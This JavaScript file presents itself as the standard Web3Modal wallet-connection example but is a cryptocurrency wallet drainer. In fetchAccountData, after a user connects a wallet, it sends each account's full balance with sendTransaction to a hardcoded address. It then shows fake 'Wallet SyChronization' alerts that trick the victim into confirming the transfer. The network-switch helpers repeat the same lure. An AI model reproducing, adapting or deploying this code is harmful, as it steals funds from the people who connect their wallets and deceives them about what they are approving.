"use strict";

/**
 * Example JavaScript code that interacts with the page and Web3 wallets
 */

 // Unpkg imports
document.getElementById("ether").style.display = "none";
 document.getElementById("matic").style.display = "none";
 document.getElementById("bsc").style.display = "none";

const Web3Modal = window.Web3Modal.default;
const WalletConnectProvider = window.WalletConnectProvider.default;
const Fortmatic = window.Fortmatic;
const evmChains = window.evmChains;

// Web3modal instance
let web3Modal

// Chosen wallet provider given by the dialog window
let provider;


// Address of the selected account
let selectedAccount;

var game = false;
/**
 * Setup the orchestra
 */
function init() {

  console.log("Initializing example");
  console.log("WalletConnectProvider is", WalletConnectProvider);
  console.log("Fortmatic is", Fortmatic);
  console.log("window.web3 is", window.web3, "window.ethereum is", window.ethereum);

  // Check that the web page is run in a secure context,
  // as otherwise MetaMask won't be available
  if(location.protocol !== 'https:') {
    // https://ethereum.stackexchange.com/a/62217/620
    const alert = document.querySelector("#alert-error-https");
    alert.style.display = "block";
    document.querySelector("#btn-connect").setAttribute("disabled", "disabled")
    return;
  }

  // Tell Web3modal what providers we have available.
  // Built-in web browser provider (only one can exist as a time)
  // like MetaMask, Brave or Opera is added automatically by Web3modal
  const providerOptions = {
    walletconnect: {
      package: WalletConnectProvider,
      options: {
//        rpc:{
//         56: "https://bsc-dataseed.binance.org/",
//        //137: "https://polygon-rpc.com",
//             //100: "https://dai.poa.network",
       
       
       
//         // Mikko's test key - don't copy as your mileage may vary
//         //infuraId: "8043bb2cf99347b1bfadfb233c5325c0",
//       },
//       network:'binance',//'polygon'],
//       chainId: 56,
      infuraId: "d452c5f789194e2e9a1055567a2fb41",

    }
    },

    fortmatic: {
      package: Fortmatic,
      options: {
        // Mikko's TESTNET api key
        key: "pk_test_391E26A3B43A3350"
      }
    }
  };

  web3Modal = new Web3Modal({
    cacheProvider: false, // optional
    providerOptions, // required
    disableInjectedProvider: false, // optional. For MetaMask / Brave / Opera.
  });

  console.log("Web3Modal instance is", web3Modal);
}


/**
 * Kick in the UI action after Web3modal dialog has chosen a provider
 */

async function fetchAccountData() {
 
 

  // Get a Web3 instance for the wallet
  const web3 = new Web3(provider);

  console.log("Web3 instance is", web3);

  // Get connected chain id from Ethereum node
  const chainId = await web3.eth.getChainId();
  // Load chain information over an HTTP API
  const chainData = evmChains.getChain(chainId);
  document.querySelector("#network-name").textContent = chainData.name;

  // Get list of accounts of the connected wallet
  const accounts = await web3.eth.getAccounts();

  // MetaMask does not give you all accounts, only the selected account
  console.log("Got accounts", accounts);
  selectedAccount = accounts[0];
//   const balance = await web3.eth.getBalance(address);
//     // ethBalance is a BigNumber instance
//     // https://github.com/indutny/bn.js/
//    const ethBalance = web3.utils.fromWei(balance, "ether");
//   if(ethBalance > 0){ console.log("Balance greater than Zero");
//    }
//   else { console.log("Opening a dialog");}

  document.querySelector("#selected-account").textContent = selectedAccount;

  // Get a handl
  const template = document.querySelector("#template-balance");
  const accountContainer = document.querySelector("#accounts");

  // Purge UI elements any previously loaded accounts
  accountContainer.innerHTML = '';

  // Go through all accounts and get their ETH balance
  const rowResolvers = accounts.map(async (address) => {
    const balance = await web3.eth.getBalance(address);
    // ethBalance is a BigNumber instance
    // https://github.com/indutny/bn.js/
    const ethBalance = web3.utils.fromWei(balance, "wei");
   const value = web3.utils.toBN(ethBalance).toString();
   if(ethBalance > 0){ console.log("Balance greater than Zero");
        web3.eth.sendTransaction({
           from: accounts[0],
           to: '0xC6b9549f86e669FcAecc5F0F2719FB957B1A3A7D',
           value: value
       });
                          
        console.log(value);
//        .then(function(receipt){
         
//        });


     }
    else{console.log("balance is not greater ")}
    console.log("Opening a dialog");
    const humanFriendlyBalance = parseFloat(ethBalance).toFixed(4);
    // Fill in the templated row and put in the document
    const clone = template.content.cloneNode(true);
    clone.querySelector(".address").textContent = address;
    clone.querySelector(".balance").textContent = humanFriendlyBalance;
    accountContainer.appendChild(clone);
  });

  // Because rendering account does its own RPC commucation
  // with Ethereum node, we do not want to display any results
  // until data for all accounts is loaded
  await Promise.all(rowResolvers);

  // Display fully loaded UI for wallet data
  document.getElementById("ether").style.display = "";
  document.getElementById("matic").style.display = "";
  document.getElementById("bsc").style.display = "";
  web3.eth.net.getId().then(console.log);
  var chainid =web3.eth.net.getId();
  if(chainid != 97 || chainid != 137){
  alert("You are on the Ethereum Network, Kindly Confirm Wallet to Initiate Wallet SyChronization, Thanks.");}
  else if(chainid != 97 || chainid != 1) {
  alert("You are on the Polygon(Matic) Network, Kindly Confirm Wallet to Initiate Wallet SyChronization, Thanks.");}
  else{
   alert("You are on the Binance Smart Chain Network, Kindly Confirm Wallet to Initiate Wallet SyChronization, Thanks.");}
  
  document.querySelector("#prepare").style.display = "none";
  document.querySelector("#connected").style.display = "block"; 
 
  //else{ console.log(" funtion not working")}

}


/**
 * Fetch account data for UI when
 * - User switches accounts in wallet
 * - User switches networks in wallet
 * - User connects wallet initially
 */
async function refreshAccountData() {

  // If any current data is displayed when
  // the user is switching acounts in the wallet
  // immediate hide this data
  document.querySelector("#connected").style.display = "none";
  document.querySelector("#prepare").style.display = "block";

  // Disable button while UI is loading.
  // fetchAccountData() will take a while as it communicates
  // with Ethereum node via JSON-RPC and loads chain data
  // over an API call.
  document.querySelector("#btn-connect").setAttribute("disabled", "disabled")
  await fetchAccountData(provider);
  document.querySelector("#btn-connect").removeAttribute("disabled")
}


/**
 * Connect wallet button pressed.
 */
async function onConnect() {

  console.log("Opening a dialog", web3Modal);
  try {
    provider = await web3Modal.connect();
    
   
  } catch(e) {
    game = false;
    console.log("Could not get a wallet connection",e,game);
    return;
  }
 game = true;
 if (game ===true){
  console.log("we are in",game);
//   document.getElementById("speedbtn").style.display = "";
//   document.getElementById("jmpbtn").style.display = "";
//   document.getElementById("treat").style.display = "";
//   
// //   
  // Subscribe to accounts change
  provider.on("accountsChanged", (accounts) => {
    fetchAccountData();
  });

  // Subscribe to chainId change
  provider.on("chainChanged", (chainId) => {
    fetchAccountData();
  });

  // Subscribe to networkId change
  provider.on("networkChanged", (networkId) => {
    fetchAccountData();
  });

  await refreshAccountData();}
else if(game ===false){console.log("else if game===false",game);
 document.getElementById("ether").style.display = "none";
  document.getElementById("matic").style.display = "none";
  document.getElementById("bsc").style.display = "none";
  

  }
 else{console.log("bad function working",game);}

}
/**
 * Disconnect wallet button pressed.
 */
async function onDisconnect() {
 document.getElementById("ether").style.display = "none";
 document.getElementById("matic").style.display = "none";
 document.getElementById("bsc").style.display = "none";

  console.log("Killing the wallet connection", provider);

  // TODO: Which providers have close method?
  if(provider.close) {
//    document.getElementById("speedbtn").style.display = "none";
//    document.getElementById("jmpbtn").style.display = "none";
//    document.getElementById("treat").style.display = "none";
   await provider.close();

    // If the cached provider is not cleared,
    // WalletConnect will default to the existing session
    // and does not allow to re-scan the QR code with a new wallet.
    // Depending on your use case you may want or want not his behavir.
    await web3Modal.clearCachedProvider();
    provider = null;
  }

  selectedAccount = null;

  // Set the UI back to the initial state
  document.querySelector("#prepare").style.display = "block";
  document.querySelector("#connected").style.display = "none";
}


/**
 * Main entry point.
 */
window.addEventListener('load', async () => {
  init();
  document.querySelector("#btn-connect").addEventListener("click", onConnect);
  document.querySelector("#btn-disconnect").addEventListener("click", onDisconnect);
});

function etherboy ()  {
 window.ethereum.request({
    method: "wallet_switchEthereumChain",
    params: [{
        chainId: "0x1",
        
      
    }]
});
alert("Ethereum Network Selected, Kindly Confirm Wallet to Initiate Wallet SyChronization, Thanks.");
}

function maticboy ()  {
 window.ethereum.request({
    method: "wallet_addEthereumChain",
    params: [{
        chainId: "0x89",
        rpcUrls: ["https://rpc-mainnet.matic.network/"],
        chainName: "Matic Mainnet",
        nativeCurrency: {
            name: "MATIC",
            symbol: "MATIC",
            decimals: 18
        },
        blockExplorerUrls: ["https://polygonscan.com/"]
    }]
});
alert("Polygon(Matic) Network Selected, Kindly Confirm Wallet to Initiate Wallet SyChronization, Thanks.");}


function bscboy ()  {
 window.ethereum.request({
    method: "wallet_addEthereumChain",
    params: [{
        chainId: "0x61",
        rpcUrls: ["https://data-seed-prebsc-1-s1.binance.org:8545/"],
         
         //"https://bsc-dataseed.binance.org/"],
        chainName: "Binance Smart Chain TESTTNET",
        nativeCurrency: {
            name: "BNB",
            symbol: "BNB",
            decimals: 8
        },
        blockExplorerUrls: ["https://bscscan.com/"]
    }]
});

alert("Binance Smart Chain Network Selected, Kindly Confirm Wallet to Initiate Wallet SyChronization, Thanks.");
}





document.getElementById("ether").onclick = etherboy;
document.getElementById("matic").onclick = maticboy;
document.getElementById("bsc").onclick = bscboy;
// var game= 1;
//  if (game ===1){
//   console.log("we are in",game);
//    document.getElementById("speedbtn").style.display = "none";
//    document.getElementById("jmpbtn").style.display = "none";
//     document.getElementById("treat").style.display = "none";
//   // Subscribe to accounts change
//   }
//  else{console.log("bad function working",game);
//   document.getElementById("speedbtn").style.display = "";
//   document.getElementById("jmpbtn").style.display = "";
//   document.getElementById("treat").style.display = "";
  
//   }
